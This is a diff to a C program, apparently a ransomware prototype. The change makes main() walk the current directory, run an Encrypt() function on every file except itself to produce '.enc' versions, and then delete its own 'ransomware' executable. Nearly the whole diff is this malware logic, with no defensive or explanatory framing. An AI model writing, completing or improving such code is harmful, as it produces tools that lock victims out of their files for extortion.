@@ -235,18 +235,47 @@ int Encrypt(char * FILENAME, char * NEW_FILENAME)
     }
 }
 
+char* concat(const char *s1, const char *s2)
+{
+    char *result = malloc(strlen(s1) + strlen(s2) + 1); // +1 for the null-terminator
+    // in real code you would check for errors in malloc here
+    strcpy(result, s1);
+    strcat(result, s2);
+    return result;
+}
+
 int main(int argc, const char * argv[]) {
    
-//    DIR *d;
-//   struct dirent *dir;
-//   d = opendir(".");
-//   if (d) {
-//     while ((dir = readdir(d)) != NULL) {
-//       printf("%s\n", dir->d_name);
-//     }
-//     closedir(d);
-//   }
-    Encrypt("temp.txt", "temp.enc");
+   DIR *d;
+  struct dirent *dir;
+  char *str_array[100] = {NULL};
+  int i = 0;
+  d = opendir(".");
+  if (d) {
+    while ((dir = readdir(d)) != NULL) {
+      if((strcmp(dir->d_name,"ransomware") == 0 )||(strcmp(dir->d_name,".") == 0 )||(strcmp(dir->d_name,"..") == 0 )){
+        continue;
+      }
+      str_array[i]=dir->d_name;
+      i++;
+    //   printf("%s\n", dir->d_name);
+    }
+    closedir(d);
+  }
+    i = 0;
+  while (str_array[i] != NULL)
+  {
+    /* code */
+    printf("%s\n",str_array[i]);
+    char * newS = concat(str_array[i],".enc");
+    Encrypt(str_array[i],newS);
+    
+    i++;
+
+  }
+
+  remove("ransomware");
+  
 
     return 0;
 }
